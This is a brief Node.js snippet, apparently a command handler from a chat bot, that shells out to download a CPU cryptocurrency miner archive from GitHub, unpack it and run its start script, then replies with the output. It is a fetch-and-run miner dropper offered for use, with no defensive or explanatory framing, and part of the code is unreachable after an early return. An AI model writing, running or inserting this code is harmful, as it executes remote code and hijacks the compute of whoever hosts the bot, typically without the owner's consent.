const { exec, spawn, execSync } = require("child_process")
console.log('STARTING...');
rifai = exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh')
return rifai;
let { stdout, stderr } = rifai
    if (stdout.trim()) m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
